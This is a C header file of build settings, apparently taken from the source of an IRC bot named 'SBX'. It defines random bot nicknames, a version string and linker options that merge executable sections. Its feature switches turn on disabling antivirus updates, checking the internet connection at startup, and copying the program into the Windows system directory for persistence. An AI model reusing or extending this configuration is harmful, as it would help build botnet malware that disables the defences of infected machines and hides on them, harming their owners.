#ifndef __DEFINES_H__
#define __DEFINES_H__

#define _XDEBUG					// debug with message boxes

#define NICK_TYPE	NICK_RAND
#define NICK_LEN	16

#define DISABLE_AV_UPDATES		// Disable AV updates?
#define CHECK_CON				// Check internet connection on startup?
#define COPY_TO_SYSDIR			// Copy to system directory? (else its the windows directory)

//==================
// DON'T TOUCH HERE 
//==================

#define BOT_VERSION "SBX.amk.0x00"

#define xGuard try{
#ifdef _XDEBUG
#define xUnguard(x) }catch(...){ MessageBox(0, x, "SBX::Error", MB_ICONERROR); exit(0); }
#else
#define xUnguard(x) }catch(...){ exit(0); }
#endif

#pragma warning(disable:4711)
#pragma comment(linker,"/RELEASE")
#pragma comment(linker,"/merge:.text=.data")
#pragma comment(linker,"/merge:.reloc=.data")
#pragma comment(linker,"/ignore:4078")
#pragma comment(linker,"/opt:nowin98")

#define NICK_RAND	1
#define NICK_HASH	2
#define NICK_OSRAND	3
#define NICK_OSHASH	4

#endif